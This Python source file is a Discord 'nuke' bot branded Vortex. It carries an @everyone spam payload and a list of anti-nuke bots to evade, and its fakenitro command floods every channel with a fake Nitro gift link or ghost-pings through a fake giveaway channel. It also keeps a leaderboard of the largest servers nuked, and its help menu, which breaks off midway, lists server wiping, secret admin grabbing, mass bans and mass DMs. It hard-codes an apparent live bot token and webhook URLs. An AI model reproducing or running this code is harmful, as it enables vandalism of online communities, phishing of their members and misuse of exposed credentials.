import asyncio, base64, json, os, random
import time
from datetime import datetime, timezone # Import timezone for aware datetimes

import aiohttp, discord
from discord import app_commands, Interaction
from discord.errors import HTTPException
from discord.ext import commands, tasks
from discord.ext.commands import BucketType, CommandOnCooldown, Cooldown, cooldown # Cooldown not directly used, but good to have

# Intents must be enabled in your bot's Discord Developer Portal page
# discord.Intents.all() includes all privileged intents, ensure they are enabled
intents = discord.Intents.all()
# You might want to explicitly list intents rather than .all() for future-proofing and security.
# Example: intents = discord.Intents(guilds=True, members=True, messages=True, message_content=True, webhooks=True, presences=True)

leaderboard_message = None
NUKE_STATS_FILE = "nuke_stats.json"
PREMIUM_FILE = "premium.json"
CONFIG_FILE = "config.json"

# IMPORTANT: These IDs should be valid for your specific Discord setup
# PREM is likely intended to be a Role ID for premium users.
PREM = 1474091358267510898 # Example: Replace with your actual Premium Role ID
MOD_ROLE_ID = 1414916058120192051 # Example: Replace with your actual Moderator Role ID
WHITELIST = [ # Users who can use special commands like `addprem`
    1317248476920414298,  # User 1
    1320349118102769767,  # User 2
    1195644166105997315   # User 3
]
BLACKLISTED_GUILD_ID = 1474091109213929736 # Example: Replace with a guild ID you want to blacklist
OWNER_ID = 1317248476920414298 # Your Discord User ID (Bot Owner)
LEADERBOARD_CHANNEL_ID = 1401931021544460389 # Channel ID for the nuke leaderboard
TOKEN = 'MTQ3MTYzMTQ1NTAxMTczMzY1NQ.GwrdUH.LT7FFqlIvJBuwPyCURoM24soc9knzCIpyXMvMM'  # <<< IMPORTANT: Replace with your actual bot token
LOG_WEBHOOK_URL = 'https://discord.com/api/webhooks/1474547658587639860/BL9LJT-z_QJf93Yz4FF8pGOouGcyLNXhD2AS_G5LFwqgiapfLl_KRdcvd61fKH2iiGo_'  # <<< IMPORTANT: Replace with your actual log webhook URL for nuke events


BLOCKED_BOT_IDS = [ # Known anti-nuke bot user IDs
    651095740390834176,
    548410451818708993,
]

BLOCKED_BOT_NAMES = [ # Known anti-nuke bot names
    "Breed",
    "Wick",
    "Beemo",
    "AntiNuke",
]

# --- VORTEX PAYLOAD ---
# Using r"""...""" for raw string to avoid unintended escape sequences.
# The original payload seems to contain a zero-width space in '[​]' which is preserved.
VORTEX_PAYLOAD = r"""# 🚨 @everyone 🚨
## 👑 OWNED BY VORTEX, LMAO 👑[​](<https://discord.gg/pGqmeSYuU>)
> 🔊 SUBWOOFERS BLOWN. AMPS FRIED.
> 🐉 BEARDED DRAGONS HAVE ASSIMILATED THE MAINFRAME.
> 📱 SYSTEM WIPED.
```yaml
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗
████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██║  ██║
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██║  ██║
██║ ╚████║╚██████╔╝██║  ██╗███████╗██████╔╝
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝
[FATAL ERROR]: TOTAL ANNIHILATION COMPLETE.
""" + " ".join(["💥 @everyone WAKE UP 💥" for _ in range(68)])

def save_nuke_stats(user_id, guild):
    """Saves nuke statistics for a user and the nuked server."""
    try:
        with open(NUKE_STATS_FILE, "r", encoding="utf-8") as f:
            stats = json.load(f)
    except FileNotFoundError:
        stats = {"users": {}, "servers": {}}
    except json.JSONDecodeError:
        print(f"Warning: {NUKE_STATS_FILE} was empty or corrupt, initializing new stats.")
        stats = {"users": {}, "servers": {}}

    stats.setdefault("users", {})
    stats.setdefault("servers", {})

    user_id_str = str(user_id)
    guild_id_str = str(guild.id)

    # Increment user's nuke count
    if user_id_str not in stats["users"]:
        stats["users"][user_id_str] = {"uses": 1}
    else:
        stats["users"][user_id_str]["uses"] += 1

    # Record/update server info (last user to nuke it, member count, name)
    stats["servers"][guild_id_str] = {
        "user_id": user_id_str,
        "member_count": guild.member_count,
        "server_name": guild.name
    }

    with open(NUKE_STATS_FILE, "w", encoding="utf-8") as f:
        json.dump(stats, f, indent=2)

def get_show_username(user_id: int) -> bool:
    """Gets the user's preference for showing their username in logs."""
    config = get_user_config(user_id)
    return config.get("show_username", True)

def load_premium_users() -> list[int]:
    """Loads the list of premium user IDs."""
    if not os.path.exists(PREMIUM_FILE):
        return []
    with open(PREMIUM_FILE, "r", encoding="utf-8") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            print(f"Warning: {PREMIUM_FILE} was empty or corrupt, returning empty list.")
            return []

def save_premium_users(user_ids: list[int]):
    """Saves the list of premium user IDs."""
    with open(PREMIUM_FILE, "w", encoding="utf-8") as f:
        json.dump(user_ids, f, indent=2)

def is_premium_user(user_id: int) -> bool:
    """Checks if a user is a premium user."""
    premium_users = load_premium_users()
    return user_id in premium_users

def load_config() -> dict:
    """Loads the global bot configuration."""
    if not os.path.exists(CONFIG_FILE):
        return {}
    with open(CONFIG_FILE, "r", encoding="utf-8") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            print(f"Warning: {CONFIG_FILE} was empty or corrupt, returning empty dict.")
            return {}

def save_config(config: dict):
    """Saves the global bot configuration."""
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=2)

def get_user_config(user_id: int) -> dict:
    """Gets the configuration for a specific user."""
    config = load_config()
    return config.get(str(user_id), {})

def set_user_config(user_id: int, key: str, value):
    """Sets a specific configuration key-value pair for a user."""
    config = load_config()
    user_str = str(user_id)
    if user_str not in config:
        config[user_str] = {}
    config[user_str][key] = value
    save_config(config)

class CooldownManager:
    """Manages cooldowns for users outside of discord.ext.commands."""
    def __init__(self, cooldown_seconds: int):
        self.cooldown_seconds = cooldown_seconds
        self.user_timestamps = {}

    def can_use(self, user_id: int) -> tuple[bool, int]:
        """
        Checks if a user can use a command based on cooldown.
        Returns (True, 0) if allowed, (False, seconds_remaining) if on cooldown.
        """
        now = time.time()
        last_time = self.user_timestamps.get(user_id, 0)
        elapsed = now - last_time
        if elapsed >= self.cooldown_seconds:
            self.user_timestamps[user_id] = now
            self.cleanup()
            return True, 0
        else:
            return False, int(self.cooldown_seconds - elapsed)

    def cleanup(self):
        """Removes expired cooldown entries."""
        now = time.time()
        to_delete = [user for user, ts in self.user_timestamps.items() if now - ts > self.cooldown_seconds]
        for user in to_delete:
            del self.user_timestamps[user]

# Example cooldown manager, e.g., for the !setup command
cooldown_manager = CooldownManager(100)

# --- User-specific Configuration Functions ---
# These functions get/set user preferences, leveraging the get/set_user_config helpers

def set_show_username(user_id: int, value: bool):
    set_user_config(user_id, "show_username", value)

def get_channel_name(user_id: int) -> str:
    return get_user_config(user_id).get("channel_name", "bearded-dragon-takeover")

def set_channel_name(user_id: int, value: str):
    set_user_config(user_id, "channel_name", value)

def get_webhook_name(user_id: int) -> str:
    return get_user_config(user_id).get("webhook_name", "Vortex")

def set_webhook_name(user_id: int, value: str):
    set_user_config(user_id, "webhook_name", value)

def get_webhook_message(user_id: int) -> str:
    return get_user_config(user_id).get("webhook_message", VORTEX_PAYLOAD)

def set_webhook_message(user_id: int, value: str):
    set_user_config(user_id, "webhook_message", value)

def get_server_name(user_id: int) -> str:
    return get_user_config(user_id).get("server_name", "OWNED BY VORTEX")

def set_server_name(user_id: int, value: str):
    set_user_config(user_id, "server_name", value)

def get_role_name(user_id: int) -> str:
    return get_user_config(user_id).get("role_name", "join vortex")

def set_role_name(user_id: int, value: str):
    set_user_config(user_id, "role_name", value)

@tasks.loop(minutes=10)
async def update_leaderboard():
    """Updates the nuke leaderboard message every 10 minutes."""
    if not os.path.exists(NUKE_STATS_FILE):
        return

    with open(NUKE_STATS_FILE, "r", encoding="utf-8") as f:
        try:
            data = json.load(f)
        except json.JSONDecodeError:
            print(f"Warning: {NUKE_STATS_FILE} was empty or corrupt for leaderboard, skipping update.")
            return

    leaderboard = []

    # Aggregate server data by the user who nuked it
    for server_id, info in data.get("servers", {}).items():
        user_id = info.get("user_id")
        member_count = info.get("member_count", 0)
        server_name = info.get("server_name", "Unknown")

        if user_id:
            leaderboard.append((user_id, member_count, server_name))

    user_best = {}
    for user_id, member_count, server_name in leaderboard:
        # For each user, keep track of their largest nuke (by member count)
        if user_id not in user_best or member_count > user_best[user_id][0]:
            user_best[user_id] = (member_count, server_name)

    # Sort users by their highest nuke count and take the top 10
    sorted_users = sorted(user_best.items(), key=lambda x: x[1][0], reverse=True)[:10]

    embed = discord.Embed(
        title="🏆・Top Nukers (by server size)",
        color=0xa874d1,
        timestamp=datetime.now(timezone.utc) # Use timezone-aware datetime
    )

    lines = ["Updated every 10 minutes\n"]

    for i, (user_id, (member_count, server_name)) in enumerate(sorted_users, 1):
        try:
            user = await bot.fetch_user(int(user_id))
            # Use global_name if available, fall back to display_name, then name
            display_name = user.global_name if user.global_name else user.display_name
            line = f"{i}. **{display_name}** ({user.name}) - **{server_name}**: `{member_count}` members\n"
            lines.append(line)
        except discord.NotFound:
            print(f"User with ID {user_id} not found for leaderboard.")
            lines.append(f"{i}. **Unknown User ({user_id})** - **{server_name}**: `{member_count}` members\n")
        except Exception as e:
            print(f"Error fetching user {user_id} for leaderboard: {e}")
            lines.append(f"{i}. **Error User ({user_id})** - **{server_name}**: `{member_count}` members\n")


    embed.description = "\n".join(lines)

    channel = bot.get_channel(LEADERBOARD_CHANNEL_ID)
    if channel:
        try:
            # Delete old bot messages in the channel to keep it clean
            # Use a list comprehension to build tasks for faster deletion
            delete_tasks = [msg.delete() async for msg in channel.history(limit=20) if msg.author == bot.user and msg.embeds and msg.embeds[0].title == embed.title]
            await asyncio.gather(*delete_tasks, return_exceptions=True)
            await channel.send(embed=embed)
        except discord.Forbidden:
            print(f"Cannot send messages or delete messages in leaderboard channel {LEADERBOARD_CHANNEL_ID}. Check bot permissions.")
        except Exception as e:
            print(f"Error updating leaderboard message: {e}")
    else:
        print(f"Leaderboard channel with ID {LEADERBOARD_CHANNEL_ID} not found.")

async def send_log(ctx: commands.Context):
    """Sends a detailed log of a command execution to a configured webhook."""
    guild = ctx.guild
    user = ctx.author
    show_name = get_show_username(user.id)

    log_text = ""
    try:
        if os.path.exists("log_messages.txt"):
            with open("log_messages.txt", "r", encoding="utf-8") as f:
                lines = [line.strip() for line in f if line.strip()]
                if lines:
                    log_text = random.choice(lines)
        else:
            log_text = "Command executed successfully." # Default if file doesn't exist
    except Exception as e:
        print(f"[!] Error reading log_messages.txt: {e}")
        log_text = "Command executed successfully (log message generation failed)." # Fallback

    embed = discord.Embed(
        title="Command Executed",
        color=discord.Color.red(),
        timestamp=datetime.now(timezone.utc) # Use timezone-aware datetime
    )
    embed.add_field(name="Command", value=f"`{ctx.command.name}`", inline=True)
    if ctx.guild:
        embed.add_field(name="Server Name", value=f"`{guild.name}`", inline=True)
        embed.add_field(name="Members", value=f"`{guild.member_count}`", inline=True)

        # Check if guild.owner is None (can happen in rare edge cases)
        owner_info = f"`{guild.owner.display_name}` ({guild.owner.name})" if guild.owner else "`Unknown`"
        embed.add_field(name="Server Owner", value=owner_info, inline=False)
        embed.add_field(name="Server Created", value=f"`{guild.created_at.strftime('%Y-%m-%d %H:%M UTC')}`", inline=True)
        embed.add_field(name="Roles", value=f"`{len(guild.roles)}`", inline=True)
        embed.add_field(name="Emojis", value=f"`{len(guild.emojis)}`", inline=True)
        embed.add_field(name="Boost Level", value=f"`{guild.premium_tier}`", inline=True)
        embed.add_field(name="Boost Count", value=f"`{guild.premium_subscription_count}`", inline=True)
        embed.add_field(name="Verification Level", value=f"`{str(guild.verification_level).capitalize()}`", inline=True)

    if show_name:
        embed.add_field(
            name="Command Run By",
            value=f"`{user.display_name}` ({user.name})",
            inline=False
        )
    else:
        embed.add_field(
            name="Command Run By",
            value="`hidden`",
            inline=False
        )

    embed.add_field(name="Bot Latency", value=f"`{round(ctx.bot.latency * 1000)} ms`", inline=True)

    if guild and guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    if guild:
        embed.set_footer(text=f"Server ID: {guild.id}")

    if LOG_WEBHOOK_URL: # Only send if URL is provided
        try:
            webhook = discord.Webhook.from_url(LOG_WEBHOOK_URL, session=bot.webhook_session) # Use bot's session
            # content can be None if only embed is present
            await webhook.send(content=log_text if log_text else None, embed=embed)
        except Exception as e:
            print(f"Error sending log to webhook: {e}")
    else:
        print("LOG_WEBHOOK_URL is not set, skipping webhook log.")

class SettingsModal(discord.ui.Modal):
    """A modal for users to configure their bot settings."""
    def __init__(self, user_id: int):
        super().__init__(title="Configure Your Settings")
        self.user_id = user_id
        self.is_premium = is_premium_user(user_id) # Check premium status once for efficiency

        # Input for showing username
        self.show_username_input = discord.ui.TextInput(
            label="Show username in logs? (yes/no)",
            placeholder="yes or no",
            default="yes" if get_show_username(user_id) else "no",
            max_length=3,
            required=False,
            row=0
        )
        # Premium specific settings inputs
        self.channel_name_input = discord.ui.TextInput(
            label="Channel Name (Premium required)",
            placeholder="nuked-channel",
            default=get_channel_name(user_id) if self.is_premium else "bearded-dragon-takeover",
            max_length=100, # Discord channel names have max 100 chars, but usually shorter (32)
            required=False,
            row=1
        )
        self.webhook_name_input = discord.ui.TextInput(
            label="Webhook Name (Premium required)",
            placeholder="Nuke Webhook",
            default=get_webhook_name(user_id) if self.is_premium else "Vortex",
            max_length=100, # Discord webhook names have max 100 chars
            required=False,
            row=2
        )
        # Webhook message can be very long
        self.webhook_message_input = discord.ui.TextInput(
            label="Webhook Message (Premium required)",
            placeholder="Server has been nuked!",
            default=get_webhook_message(user_id) if self.is_premium else VORTEX_PAYLOAD,
            max_length=2000, # Discord webhook message content max length
            style=discord.TextStyle.long, # Allow multi-line input
            required=False,
            row=3
        )
        self.server_name_input = discord.ui.TextInput(
            label="Server Name (Premium required)",
            placeholder="Nuked Server",
            default=get_server_name(user_id) if self.is_premium else "OWNED BY VORTEX",
            max_length=100, # Discord guild names have max 100 chars
            required=False,
            row=4
        )
        self.role_name_input = discord.ui.TextInput(
            label="Role Name (Premium required)",
            placeholder="join vortex",
            default=get_role_name(user_id) if self.is_premium else "join vortex",
            max_length=100, # Discord role names have max 100 chars
            required=False,
            row=5
        )

        self.add_item(self.show_username_input)
        self.add_item(self.channel_name_input)
        self.add_item(self.webhook_name_input)
        self.add_item(self.webhook_message_input)
        self.add_item(self.server_name_input)
        self.add_item(self.role_name_input)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = self.user_id

        show_username_input = self.show_username_input.value.strip().lower()
        if show_username_input in ["yes", "no"]:
            set_show_username(user_id, show_username_input == "yes")
        else:
            await interaction.response.send_message("❌ Invalid input for 'Show username?'. Please use 'yes' or 'no'.", ephemeral=True)
            return

        # Helper function to set config only if premium, otherwise reset to default
        def safe_set(key, value, default_value):
            if self.is_premium:
                set_user_config(user_id, key, value)
            else:
                # If not premium, reset custom premium settings to their defaults
                set_user_config(user_id, key, default_value)

        safe_set("channel_name", self.channel_name_input.value.strip(), "bearded-dragon-takeover")
        safe_set("webhook_name", self.webhook_name_input.value.strip(), "Vortex")
        safe_set("webhook_message", self.webhook_message_input.value.strip(), VORTEX_PAYLOAD)
        safe_set("server_name", self.server_name_input.value.strip(), "OWNED BY VORTEX")
        safe_set("role_name", self.role_name_input.value.strip(), "join vortex")

        await interaction.response.send_message("✅ Your settings have been saved.", ephemeral=True)

class DashboardView(discord.ui.View):
    """A view with a button to open the settings modal."""
    def __init__(self, user_id: int):
        super().__init__(timeout=180)
        self.user_id = user_id

    @discord.ui.button(label="Configure Settings", style=discord.ButtonStyle.primary)
    async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SettingsModal(self.user_id))

class MyBot(commands.Bot):
    """Custom bot class to encapsulate initialization logic."""
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)
        self.owner_id = OWNER_ID # Set bot owner for commands.is_owner()
        self.webhook_session = None # Initialize as None, will be set in setup_hook

    async def setup_hook(self):
        # Initialize the aiohttp.ClientSession here, after the event loop has started
        self.webhook_session = aiohttp.ClientSession()
        # Sync slash commands only once when the bot starts
        await self.tree.sync()
        print("Slash commands synced.")

    async def close(self):
        await super().close()
        if self.webhook_session: # Ensure session exists before trying to close
            await self.webhook_session.close() # Close aiohttp session on bot shutdown
            print("aiohttp client session closed.")

bot = MyBot()

@bot.command(name="addprem")
@commands.check(lambda ctx: ctx.author.id in WHITELIST) # Only whitelist users can add premium
async def addprem(ctx: commands.Context, user: discord.Member):
    """Adds a specified user to the premium list and optionally assigns a premium role."""
    premium_users = load_premium_users()

    if user.id in premium_users:
        return await ctx.send(f"✅ User {user.mention} is already a premium user.", ephemeral=True)

    premium_users.append(user.id)
    save_premium_users(premium_users)

    # Optional: Assign a premium role if it exists
    premium_role = ctx.guild.get_role(PREM)
    if premium_role and user:
        try:
            await user.add_roles(premium_role)
            await ctx.send(f"✅ Added premium role to {user.mention} in this server.", ephemeral=True)
        except discord.Forbidden:
            await ctx.send(f"❌ Could not add premium role to {user.mention}. Missing permissions.", ephemeral=True)
        except Exception as e:
            await ctx.send(f"❌ Error adding premium role: {e}", ephemeral=True)
    elif not premium_role:
        await ctx.send(f"⚠️ Premium role with ID {PREM} not found in this server. Added premium status, but no role assigned.", ephemeral=True)

    await ctx.send(f"✅ User {user.mention} added to premium list!", ephemeral=True)

@bot.command(name="syncpremroles")
@commands.check(lambda ctx: ctx.author.id in WHITELIST) # Only whitelist users can sync premium roles
async def syncpremroles(ctx: commands.Context):
    """Synchronizes premium roles for users in the current guild based on the premium list."""
    premium_ids = load_premium_users()

    premium_role = ctx.guild.get_role(PREM)
    if not premium_role:
        return await ctx.send(f"❌ Premium role with ID {PREM} not found in this server. Cannot sync roles.", ephemeral=True)

    found_count = 0
    added_count = 0
    skipped_count = 0
    failed_tasks = []

    await ctx.send("Starting to sync premium roles...", ephemeral=True)

    async def add_role_to_member(member: discord.Member, role: discord.Role):
        nonlocal added_count, skipped_count
        if role not in member.roles:
            try:
                await member.add_roles(role)
                added_count += 1
            except discord.Forbidden:
                skipped_count += 1
                print(f"Forbidden to add role to {member.display_name} ({member.id}).")
            except Exception as e:
                skipped_count += 1
                print(f"Error adding role to {member.display_name} ({member.id}): {e}")
        else:
            skipped_count += 1

    tasks_to_run = []
    for user_id in premium_ids:
        member = ctx.guild.get_member(user_id) # get_member is for users in the guild
        if member:
            found_count += 1
            tasks_to_run.append(add_role_to_member(member, premium_role))

    # Run tasks concurrently in batches without intentional delays
    await asyncio.gather(*tasks_to_run, return_exceptions=True)

    await ctx.send(f"✅ Sync complete:\n"
                   f"- Found {found_count} premium users in this server.\n"
                   f"- Added premium role to {added_count} members.\n"
                   f"- Skipped {skipped_count} members (already had role or permission error).", ephemeral=True)

@bot.tree.command(name="dashboard", description="Show your settings dashboard")
async def dashboard(interaction: discord.Interaction):
    """Displays a dashboard with user-specific bot settings."""
    user_id = interaction.user.id

    show_username = get_show_username(user_id)
    channel_name = get_channel_name(user_id)
    webhook_name = get_webhook_name(user_id)
    webhook_message = get_webhook_message(user_id)
    server_name = get_server_name(user_id)
    role_name = get_role_name(user_id)

    embed = discord.Embed(title="User Dashboard", color=discord.Color.blue())
    embed.add_field(name="Show Username", value="Yes" if show_username else "No", inline=True)
    embed.add_field(name="Channel Name", value=channel_name, inline=True)
    embed.add_field(name="Webhook Name", value=webhook_name, inline=True)
    # Truncate webhook message for display in embed field (max 1024 characters)
    embed.add_field(name="Webhook Message", value=webhook_message[:1000] + ("..." if len(webhook_message) > 1000 else ""), inline=False)
    embed.add_field(name="Server Name", value=server_name, inline=True)
    embed.add_field(name="Role Name", value=role_name, inline=True)

    view = DashboardView(user_id)
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.command()
@commands.has_role(MOD_ROLE_ID) # Checks if user has a role with this specific ID
@commands.cooldown(1, 600, BucketType.user) # 1 use per user every 600 seconds (10 minutes)
async def modraid(ctx: commands.Context, *, message: str = None):
    """Sends a message to the channel, pinging a specific role, for mod raids."""
    if message is None:
        return await ctx.send("❌ Please provide a message for the mod raid.", ephemeral=True)

    # Check if the configured moderator role actually exists in the guild
    role = ctx.guild.get_role(MOD_ROLE_ID)
    if role is None:
        return await ctx.send(f"❌ The configured moderator role with ID `{MOD_ROLE_ID}` was not found in this server.", ephemeral=True)

    # Assuming 1415313470710349834 is another role ID to be pinged
    ping_role_id = 1415313470710349834
    ping_role = ctx.guild.get_role(ping_role_id)
    ping_content = ping_role.mention if ping_role else f"<@&{ping_role_id}>" # Use mention, fallback to raw

    try:
        await ctx.send(f"{message}\n{ping_content}\n\nSent from {ctx.author.mention}")
    except discord.Forbidden:
        await ctx.send("❌ I don't have permission to send messages in this channel.", ephemeral=True)
    except Exception as e:
        await ctx.send(f"❌ An error occurred while sending the message: {e}", ephemeral=True)

    try:
        await ctx.message.delete()
    except discord.Forbidden:
        print(f"Bot missing permissions to delete message in {ctx.channel.name}")
    except Exception as e:
        print(f"Error deleting message for modraid: {e}")

@modraid.error
async def modraid_error(ctx: commands.Context, error: commands.CommandError):
    """Error handler for the modraid command."""
    if isinstance(error, commands.MissingRole):
        await ctx.send("❌ You don't have permission to use this command.", ephemeral=True)
    elif isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"⏳ This command is on cooldown. Try again in {int(error.retry_after)} seconds.", ephemeral=True)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ Missing argument. Usage: `!modraid <message>`", ephemeral=True)
    else:
        await ctx.send(f"❌ An unexpected error occurred: {error}", ephemeral=True)

@bot.command()
async def fakenitro(ctx: commands.Context):
    """Sets up a fake Nitro giveaway/spam to lure users."""
    if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
        return await ctx.reply("❌ This server is blacklisted.", ephemeral=True)

    try:
        await ctx.message.delete()
    except discord.Forbidden:
        print(f"Bot missing permissions to delete message in {ctx.channel.name}")
    except Exception as e:
        print(f"Error deleting message for fakenitro: {e}")

    try:
        dm_channel = await ctx.author.create_dm() # Await this call

        await dm_channel.send(
            "**:gift: Fake Nitro Setup**\n"
            "Please choose your method:\n\n"
            "🔹 `1` - Spam every channel\n"
            "🔹 `2` - Create giveaway channel with ghost pings (looks more real = more people joining)\n\n"
            "Reply with the number!"
        )

        def check(m):
            return m.author == ctx.author and m.channel == dm_channel and m.content in ["1", "2"]

        try:
            reply = await bot.wait_for("message", check=check, timeout=60.0) # Add timeout
            method = "spam" if reply.content == "1" else "giveaway"
        except asyncio.TimeoutError:
            return await dm_channel.send("❌ You took too long to respond. Fake Nitro setup cancelled.")

        fake_link = "https://discord.gg/pGqmeSYuU" # Default link
        if is_premium_user(ctx.author.id):
            await dm_channel.send("Premium user: Send your custom invite link or type `default`.")
            try:
                link_msg = await bot.wait_for("message", check=lambda m: m.author == ctx.author and m.channel == dm_channel, timeout=60.0)
                if link_msg.content.lower() != "default":
                    fake_link = link_msg.content.strip()
            except asyncio.TimeoutError:
                await dm_channel.send("No custom link provided. Using default invite link.")
        else:
            await dm_channel.send("Using default invite link (Premium users can customize this).")

        embed = discord.Embed(
            description=(f"# <a:nitro:1402674645790101615> You've been gifted a subscription!\n"
                         f"## Click [HERE]({fake_link}) to claim **1 month of Discord Nitro.**"),
            color=0x5865F2
        )
        embed.set_image(url="https://cdn.discordapp.com/attachments/1402005248108793970/1402666426791231618/19402688007447.png")

        if method == "spam":
            send_tasks = []
            failed_channels_names = []
            for channel in ctx.guild.text_channels:
                if channel.permissions_for(ctx.guild.me).send_messages:
                    send_tasks.append(channel.send(embed=embed))
                    send_tasks.append(channel.send("@everyone"))
                else:
                    failed_channels_names.append(channel.name)

            results = await asyncio.gather(*send_tasks, return_exceptions=True)
            success_count = sum(1 for r in results if not isinstance(r, Exception)) // 2 # Each channel gets 2 messages

            response_msg = f"✅ Nitro embed sent to `{success_count}` channels!"
            if failed_channels_names:
                response_msg += f"\n❌ Failed to send to {len(failed_channels_names)} channels: {', '.join(failed_channels_names[:5])}{'...' if len(failed_channels_names) > 5 else ''}"
            await dm_channel.send(response_msg)

        elif method == "giveaway":
            # Set permissions: @everyone cannot send messages or add reactions
            overwrites = {ctx.guild.default_role: discord.PermissionOverwrite(send_messages=False, add_reactions=False)}
            try:
                # Check bot permissions before creating channel
                if not ctx.guild.me.guild_permissions.manage_channels:
                    await dm_channel.send("❌ I don't have 'Manage Channels' permission to create the giveaway channel.")
                    return

                channel = await ctx.guild.create_text_channel("🎁nitro-giveaway", overwrites=overwrites)
                await channel.send(embed=embed)
                ghost_ping_tasks = []
                for i in range(20):
                    # Remove delay for super fast ghost pings
                    ghost_ping_tasks.append(send_and_delete(channel, "@everyone", 0)) # No delay

                await asyncio.gather(*ghost_ping_tasks, return_exceptions=True) # Run concurrently
                await dm_channel.send(f"✅ 20 ghost pings sent in the giveaway channel: {channel.mention}!")
            except discord.Forbidden:
                await dm_channel.send("❌ I don't have permission to create channels or send messages.")
            except Exception as ex:
                await dm_channel.send(f"❌ Error creating giveaway channel or sending pings: {ex}")

    except asyncio.TimeoutError: # Catch timeout from initial wait_for
        await ctx.author.send("❌ Fake Nitro setup cancelled due to timeout.")
    except discord.Forbidden:
        await ctx.reply("❌ I couldn't DM you. Please check your privacy settings.", ephemeral=True)
    except Exception as e:
        await ctx.author.send(f"❌ An unexpected error occurred during Fake Nitro setup: {e}", ephemeral=True)
        print(f"Fake Nitro error: {e}")

async def send_and_delete(channel: discord.TextChannel, content: str, delay: float = 0.3):
    """Helper function to send a message and then delete it after a delay."""
    try:
        msg = await channel.send(content)
        if delay > 0: # Only sleep if a delay is specified
            await asyncio.sleep(delay)
        await msg.delete()
    except discord.NotFound:
        pass # Message already deleted
    except discord.Forbidden:
        print(f"Missing permissions to send or delete message in {channel.name}.")
    except Exception as e:
        print(f"Error in send_and_delete for channel {channel.name}: {e}")

@bot.command()
async def invite(ctx: commands.Context):
    """Sends the bot's invite link to the user's DMs."""
    # Requesting administrator=True for a nuke bot is typical, but for general bots, specify permissions.
    invite_link = discord.utils.oauth_url(ctx.bot.user.id, permissions=discord.Permissions(administrator=True))
    embed = discord.Embed(title="🔗 Invite The Bot", description=f"Click here to invite me: [Invite Link]({invite_link})", color=discord.Color.blurple())
    try:
        await ctx.author.send(embed=embed)
        await ctx.reply("📬 I've sent you the bot invite in your DMs!", ephemeral=True)
    except discord.Forbidden:
        await ctx.reply("❌ I couldn't DM you the invite. Please check your privacy settings.", ephemeral=True)
    except Exception as e:
        await ctx.reply(f"❌ An error occurred while sending the invite: {e}", ephemeral=True)

leave_hook = "https://ptb.discord.com/api/webhooks/1404434190828703744/97hc9pbvw-ecqN5idWiTdjC6oLUHzoDllzFUwmGIwpgmSsYV8_2PUR3ILhsmXNySv5GW" # Hardcoded, consider moving to config

async def log_to_webhook_leave(message: str): # Renamed function to avoid clash with python's log module
    """Sends a log message to a specific webhook for leave events."""
    print(message) # Also print to console
    if leave_hook: # Only send if URL is provided
        try:
            # Reuse the bot's aiohttp session
            await bot.webhook_session.post(leave_hook, json={"content": message})
        except Exception as e:
            print(f"Error sending leave log to webhook: {e}")
    else:
        print("Leave webhook URL is not set.")

@bot.command()
@commands.is_owner() # Only the bot owner can use this command (based on bot.owner_id)
async def leave(ctx: commands.Context):
    """Makes the bot leave all non-blacklisted servers."""
    if ctx.author.id != OWNER_ID: # Keeping original specific OWNER_ID check
        return await ctx.send("❌ You are not authorized to use this command.", ephemeral=True)

    await ctx.send("Attempting to leave all non-blacklisted servers...", ephemeral=True)
    await leave_all_servers()
    await ctx.send("✅ Finished attempting to leave servers.", ephemeral=True)

@tasks.loop(hours=6)
async def auto_leave_task():
    """Automatically leaves non-blacklisted servers every 6 hours."""
    # Keep some delay here as it's a background task, less critical for "spam speed"
    await leave_all_servers()

async def leave_all_servers():
    """Logic to leave guilds, excluding blacklisted ones."""
    all_guilds = list(bot.guilds) # Make a copy because guild.leave() modifies the list
    to_leave = [g for g in all_guilds if g.id != BLACKLISTED_GUILD_ID]
    left = 0
    failed_to_leave = 0

    log_messages = []
    leave_tasks = []

    async def perform_guild_leave(guild: discord.Guild):
        nonlocal left, failed_to_leave
        try:
            await guild.leave()
            left += 1
            log_messages.append(f"Left guild: {guild.name} ({guild.id})")
        except discord.Forbidden:
            failed_to_leave += 1
            log_messages.append(f"Failed to leave guild {guild.name} ({guild.id}) due to missing permissions.")
        except Exception as e:
            failed_to_leave += 1
            log_messages.append(f"Error leaving guild {guild.name} ({guild.id}): {e}")

    for guild in to_leave:
        leave_tasks.append(perform_guild_leave(guild))

    # Run leave tasks concurrently, minimal delay
    # Removing `await asyncio.sleep(2)` from here for speed
    await asyncio.gather(*leave_tasks, return_exceptions=True)

    final_log_msg = f"[AUTO-LEAVE] Finished! Left {left} servers, failed to leave {failed_to_leave} servers."
    await log_to_webhook_leave(final_log_msg + "\n" + "\n".join(log_messages))

@auto_leave_task.before_loop
async def before_auto_leave():
    """Waits for the bot to be ready before starting the auto-leave task."""
    await bot.wait_until_ready()

bot.remove_command("help") # This removes the default help command, allowing custom !help

@bot.command()
async def nhelp(ctx: commands.Context):
    """Shows the 'Insomnia Bot' help menu (actual commands)."""
    embed = discord.Embed(title="⚡ Insomnia Bot Help", description="List of available commands:", color=discord.Color.blurple())
    commands_list = [
        ("!setup", "Completely wipes the server."),
        ("!admin", "Tries to secretly give you admin."),
        ("[💎] !massban", "Bans everyone! (Premium only)"),
        ("!info [@user]", "Displays how many servers a user has nuked."),
        ("!invite", "Sends the bot invite to your dms."),
        ("!fakenitro", "Create a fake nitro giveaway."),
        ("/dashboard", "Displays a dashboard for custom settings."),
        ("!wspam", "Creates webhooks and mass spams the VORTEX payload."),
        ("!massdm [msg]", "Sends a direct message to every member in the server."),
        ("!renameall", "Changes everyone's nickname simultaneously."),
